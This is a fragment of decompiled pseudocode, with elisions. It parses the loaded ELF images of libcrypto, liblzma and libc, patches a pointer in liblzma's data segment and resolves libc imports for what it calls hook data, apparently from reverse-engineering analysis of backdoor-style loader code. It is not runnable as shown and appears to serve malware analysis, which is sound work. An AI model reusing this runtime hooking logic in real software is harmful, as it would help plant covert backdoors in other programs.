...
LAB_00104924:
  ...
  if ((plVar6 != (link_map *)0x0) &&
     (BVar10 = elf_parse(*(Elf64_Ehdr **)plVar6,data->elf_handles->libcrypto), BVar10 != 0)) {
    ppbVar8 = data->hooks_data_addr;
    link_map_cursor = (link_map *)0x0;
    peVar5 = data->elf_handles->liblzma;
    plVar6 = data->data->liblzma_map;
    if ((plVar6 != (link_map *)0x0) &&
       (((BVar10 = elf_parse(*(Elf64_Ehdr **)plVar6,peVar5), BVar10 != 0 &&
         ((peVar5->flags & 0x20) != 0)) &&
        (pvVar14 = elf_get_data_segment(peVar5,(u64 *)&link_map_cursor,1),
      ...
      *(link_map **)((long)pvVar14 + 0x590) = link_map_cursor + -0x598;
      ...
      if ((plVar6 != (link_map *)0x0) &&
         (BVar10 = elf_parse(*(Elf64_Ehdr **)plVar6,data->elf_handles->libc), BVar10 != 0)) {
        BVar10 = resolve_libc_imports
                           (data->data->libc_map,data->elf_handles->libc,data->libc_imports);
        return (uint)(BVar10 != 0);
      }
    }
  }
  return 0;
